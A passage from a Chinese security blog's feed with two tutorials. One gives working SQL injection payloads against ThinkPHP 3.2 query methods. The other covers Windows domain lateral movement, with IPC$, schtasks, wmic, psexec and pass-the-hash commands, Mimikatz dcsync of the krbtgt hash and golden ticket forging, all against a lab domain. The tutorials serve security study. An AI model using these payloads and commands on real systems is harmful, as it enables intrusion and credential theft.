string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>在parseSet方法中，可以将传入的参数替换成:0</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt="" loading="lazy"></p><p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bind</span><span class="token punctuation">[</span><span class="token string">':'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt="" loading="lazy"></p><p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt="" loading="lazy"></p><p>所以最终的payload为</p><pre><code>id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt="" loading="lazy"></p><h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt="" loading="lazy"></p><p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 直接使用字符串条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whereStr</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">''</span><span class="token punctuation">:</span><span class="token string">' WHERE '</span><span class="token punctuation">.</span><span class="token variable">$whereStr</span><span class="token punctuation">;</span></code></pre><p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt="" loading="lazy"></p><p>所以，payload为</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt="" loading="lazy"></p><p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果条件为空 不进行删除操作 除非设置 1=1</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$pkValue</span>            <span class="token operator">=</span>  <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_before_delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   </code></pre><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'eq'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">order</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'order'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><p>当$options[‘order’]参数参在时，跟进parseOrder方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt="" loading="lazy"></p><p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p><pre><code>order=id and(updatexml(1,concat(0x7e,(select user())),0))</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt="" loading="lazy"></p><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p><pre><code>F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</code></pre><p>这里F方法就不介绍了，直接看S方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">S</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进查看S方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt="" loading="lazy"></p><p>set方法写入缓存</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt="" loading="lazy"></p><p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">filename</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span>    <span class="token operator">=</span>    <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_KEY'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_SUBDIR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 使用子目录</span>            <span class="token variable">$dir</span>   <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_PATH_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$dir</span>    <span class="token punctuation">.</span><span class="token operator">=</span>    <span class="token variable">$name</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;where注入&quot;&gt;&lt;a href=&quot;#where注入&quot; class=&quot;headerlink&quot; title=&quot;where注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;where注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在控制器中，写个demo，利用字符串方式作为where传参时存在注
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网域渗透知识总结</title>
    <link href="http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-31T03:30:29.000Z</published>
    <updated>2020-04-29T05:17:33.373Z</updated>
    
    <content type="html"><![CDATA[<h4 id="NTML协议"><a href="#NTML协议" class="headerlink" title="NTML协议"></a><strong>NTML协议</strong></h4><p>在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%\system32\config\sam)，在域里保存在ntds.dit文件中，hash的格式为：<code>用户名称:SID:LM-Hash值:NT-Hash值</code></p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></pre><p>500冒号后面的是LM hash，32057716c8bd0647d9197a9db0b041eb是ntml hash</p><h5 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a><strong>LM Hash</strong></h5><p>LM Hash的全称是LAN Manager Hash，如果明文是<code>dbnames</code>，先要全部转换成大写，然后将大写字符串转换成16进制，如果明文大写转换的二进制不足14个字节，需要用0在后面添加到14个字节</p><pre><code>44424e414d455300000000000000    dbnames的16进制为44424e414d4553</code></pre><p>由于44424e414d4553转换二进制为8字节，所以这两个8字节数据要用魔术字符串<code>KGS!@#$%</code>DES加密</p><pre><code>4B47532140232425     为&#39;KGS!@#$%&#39;的16进制</code></pre><p>将得到的2个8字节作为key对KGS!@#$%进行des加密，可以利用安全客的一篇文章进行<a href="https://www.anquanke.com/post/id/193149#h3-2" target="_blank" rel="noopener">des加密</a></p><pre><code>44424e414d4553作为key为&#39;KGS!@#$%&#39;进行des加密：c8b9d6dc8e553d6300000000000000作为key为&#39;KGS!@#$%&#39;进行des加密：aad3b435b51404ee</code></pre><h5 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a><strong>NTML Hash</strong></h5><p>从Windows Vista开始，密码默认情况是只有存储NTML Hash，LM Hash不会存在，在NTML Hash中，先将字符串进行16进制转换，然后在转换成unicode字符串，最后使用MD4加密算法对Unicode进行加密，所以LM Hash跟NTML相比，LM明文大小写不敏感，可以判断明文是否小于8位，不使用‘KGS!@#$%’作为key进行des加密，而NTML采用单向加密方式(MD4)</p><h5 id="NTML认证协议"><a href="#NTML认证协议" class="headerlink" title="NTML认证协议"></a><strong>NTML认证协议</strong></h5><p>NTML协议认证分为三部分：协商、质询、身份验证验证</p><pre><code>                            1.协商Client &lt;----------------------------------------------------&gt;server                            2.质询(challenge)Client &lt;----------------------------------------------------&gt;server                            3.身份验证Client &lt;----------------------------------------------------&gt;server</code></pre><p>NTML协议认证过程：</p><p>1.用户输入账号密码，客户端中包含明文用用户名向服务端发起请求</p><p>2.服务端接收到客户端的请求，会生成一个challenge 16位随机数，使用存储的NTML Hash加密challenge，生成challenge1，然后将challenge的16位明文随机数发送给客户端</p><p>3.客户端接收到challenge后，使用用户登录的密码hash加密challenge生成response(challenge2)，将这个response发送给客户端</p><p>4.服务端接收到response，对challenge1和challenge2进行比较，相同的话就验证成功</p><h5 id="NTLM-v1与NTLM-v2"><a href="#NTLM-v1与NTLM-v2" class="headerlink" title="NTLM v1与NTLM v2"></a><strong>NTLM v1与NTLM v2</strong></h5><p>challenge：NTML v1是8的随机数；NTML v2是16位的随机数</p><p>Net-NTML Hash：</p><p>1.NTML v1采用的是DES加密，在16字节后面填充5个0，组成21字节，然后分成3组7个字节的，并在每7个字节后面填充1个0，成为3个8字节的DES密钥，加密上诉步骤2(server)发来的challenge，组成24字节的密文。</p><p>2.NTML v2采用的HMAC-MD5加密</p><h4 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a><strong>Kerberos协议</strong></h4><p>在域环境中，主要采用的是kerberos协议，主要有下面几个角色</p><p>1.AS：为客户端生成TGT服务</p><p>2.TGS：为客户端生成某个服务的ticket</p><p>3.KDC：安全认证中票据生成管理服务，里面包含AS和TGS</p><p>4.AD：存储整个域内的所有计算机，用户等信息</p><h5 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a><strong>Kerberos协议认证过程</strong></h5><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201912/31/102901ze0er0rhuutesc5y.png.thumb.jpg" alt="1" loading="lazy"></p><p>1.客户端向KDC(AS)发起一个认证请求(KRB_AS_REQ)，在请求的过程中，是通过用户的密码hash加密的时间戳，然后发送给AS服务器，AS服务器接收到后，采用服务器那边的密码hash进行解密这个时间戳，解密成功后，并且时间戳在一定时间范围，说明认证成功。<br> 2.AS对比用户是否在本地数据库中，使用客户端的hash进行解密，正确就返回krbtgt的密码hash加密的TGT票据(到期时间一般为8小时)，用户是无法解密这个TGT票据的，但是有了krbtgt的hash，就可以伪造’黄金票据’。还要返回一个由客户端用户ntml hash加密的Session Key(sessionkey1)，Session  Key是KDC接收请求后的随机生成的字符(KRB_AS_REP)。<br> 3.客户端用自己的密码hash解密Session Key，TGT是KDC加密的，Client无法解密，Client拿着解密出来的SessionKey去加密时间戳和TGT发送给TGS换取访问Server的票据(KRB_TGS_REQ)。<br> 4.TGS收到Client的请求后，会验证是否存在客户端要访问的这个服务，存在的话KDC使用krbtgt的密码hash对TGT进行解密，然后会查看TGT中的时间戳，看是否TGT失效，如果解密成功的TGT没有失效，向客户端发送通过sessionkey1加密的Session_key和ticket票据，在TGSREP中，用的是服务的hash加密ticket的，所有我们拥有这个服务的hash就可以制作一个ticket(即白银票据)(KRB_TGS_REP)。<br> 5.客户端拿着自己sessionkey1解密的Session_Key(sessionkey2)，然后把sessionkey2加密的时间戳和ticket发送个Server去访问服务，认证通过就可以访问(KRB_AP_REQ)。<br> 6.服务使用自己的hash去解密ticket票据，得到sessionkey2，在用sessionkey2去解密时间戳，解密成功，就用PAC去KDC问客户端是否有访问的权限，域控解密PAC，用于让客户端识别是否访问正确的服务端(KRB_AP_REP)。</p><h4 id="内网横向移动的方法"><a href="#内网横向移动的方法" class="headerlink" title="内网横向移动的方法"></a><strong>内网横向移动的方法</strong></h4><h5 id="ipc连接"><a href="#ipc连接" class="headerlink" title="ipc连接"></a><strong>ipc连接</strong></h5><pre><code>net use \\192.168.1.232\C$ admin123456 /user:fanxing.com\fanxing</code></pre><p>复制文件到主机上</p><pre><code>copy 1.bat \\192.168.1.232\c$\tools</code></pre><p>获取服务器的时间</p><pre><code>net time \\192.168.1.232</code></pre><p>创建计划任务，20:05执行1.bat文件，cobaltstrike上线成功</p><pre><code>at \\192.168.1.232 20:05 c:\tools\1.bat</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/3.png" alt="" loading="lazy"></p><p>下面是ipc连接当中常见的错误号：</p><pre><code>错误号5：拒绝访问---&gt;使用的权限太低，需要提权错误号51：Windows无法找到网络路径，网络有问题错误号53：找不到网络路径，ip地址错误、目标未开机、目标lanmanserver服务未开启、目标有防火墙(端口过滤)错误号67：找不到网络名-&gt;你的lanmanworkstation服务未启动或者目标删除了ipc$错误号1219：提供的凭据与已存在的凭据集冲突-&gt;你已经和对方建立了一个ipc，请删除在连接错误号1326：未知的用户名或错误密码错误号1792：试图登录，但是网络登录服务没启动-&gt;目标BetLogon服务未启动错误号2242：此用户的密码已经过期-&gt;目标有账号策略，强制定期要求更改密码</code></pre><h5 id="schtasks创建计划任务"><a href="#schtasks创建计划任务" class="headerlink" title="schtasks创建计划任务"></a><strong>schtasks创建计划任务</strong></h5><p>设置每天晚上8:40执行1.bat文件</p><pre><code>schtasks /create /s 192.168.1.232 /u fanxing.com\fanxing /p admin@163.com /ru &quot;SYSTEM&quot; /tn fanxing /sc DAILY /st 20:40  /tr c:\tools\1.bat /F</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/4.png" alt="" loading="lazy"></p><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h5><p>wmi服务需要开启135端口，这个是默认开启的。</p><pre><code>wmic /node:192.168.1.232 /user:fanxing.com\fanxing /password:admin@163.com process call create &quot;cmd /c 1.exe&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/5.png" alt="" loading="lazy"></p><p>使用wmic没有任何回显，可以wmicexec.vbs解决无回显的问题，或者获取一个半交互式shell。</p><pre><code>cscript wmiexec.vbs /cmd 192.168.1.232 fanxing.com\fanxing admin@163.com whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/6.png" alt="" loading="lazy"></p><h5 id="pstools"><a href="#pstools" class="headerlink" title="pstools"></a><strong>pstools</strong></h5><p>pstools中有13个小工具，这里主要利用psexec进行远程执行命令，唯一的缺点就是会开启一个服务，容易被管理员发现。</p><p>在ipc建立连接的时候，可以直接使用psexec:</p><pre><code>psexec.exe \\192.168.1.232 -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/7.png" alt="" loading="lazy"></p><p>当ipc没有连接时</p><pre><code>Psexec.exe \\192.168.1.232 -u fanxing.com\fanxing -p admin@163.com -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/8.png" alt="" loading="lazy"></p><p>使用metasploit执行</p><pre><code>use auxiliary/admin/smb/p**ec_commandset rhosts 192.168.1.232set smbuser fanxingset smbpass admin@163.comset smbdomain fanxing.comset command whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/9.png" alt="" loading="lazy"></p><h5 id="hash传递-PTH"><a href="#hash传递-PTH" class="headerlink" title="hash传递(PTH)"></a><strong>hash传递(PTH)</strong></h5><p>hash传递是通过密码的hash访问主机或者服务，不需要明文登录。hash的原理，出现在上面讲的NTML认证过程的challenge。利用metasploit：</p><pre><code>use exploit/windows/smb/psexecset rhosts 192.168.50.233set SMBPass 32057716c8bd0647d9197a9db0b041ebset SMBUser administratorset SMBDomain fanxing.com</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a><strong>黄金票据</strong></h4><p>黄金票据是AS颁发给Client的TGT票据(TGT的有效时间为20分钟)，是通过域kerberos账户(KRBTGT)加密的。实现原理就是跳过了AS的认证过程，直接向KDC的TGS服务证明通过了AS服务。一般黄金票据都是域控的权限掉了的时候，修改了域控的密码，而krbtgt的密码没有被修改，就可以重新获取到域控权限。</p><p>满足黄金票据的条件有：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域中KRBTGT的密码hash</p><p>4.伪造的用户名</p><p>在金票的利用过程中，可以使用mimikatz，cobaltstrike，metasploit来伪造。</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h5><p>导出krbtgt的NTML Hash</p><pre><code>privilege::debug      #提权lsadump::dcsync /domain:fanxing.com /user:krbtgt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/10.png" alt="" loading="lazy"></p><p>获取域的SID值，不要后面的-500</p><pre><code>whoami /all</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/11.png" alt="" loading="lazy"></p><p>伪造金票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /aes256:3df036f90aaf3a63a5cce96fc753f08beb5a2e61946e17cc7d5e6ce04b651b89 /user:fanxing /ticket:gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/12.png" alt="" loading="lazy"></p><p>导入Golden Ticket</p><pre><code>kerberos::ptt c:\users\test\gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/13.png" alt="" loading="lazy"></p><p>可以使用dir访问域控目录，要输入主机名，使用ip还是访问不到</p><pre><code>dir \\WIN-M34UCFJIPNQ\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/14.png" alt="" loading="lazy"></p><p>mimikatz还有另外一中方法</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /rc4:8b3955c065502e33716d555d4421a723 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/15.png" alt="" loading="lazy"></p><h5 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a><strong>CobaltStrike</strong></h5><p>在上线之后-&gt;执行-&gt;黄金票据</p><p><img 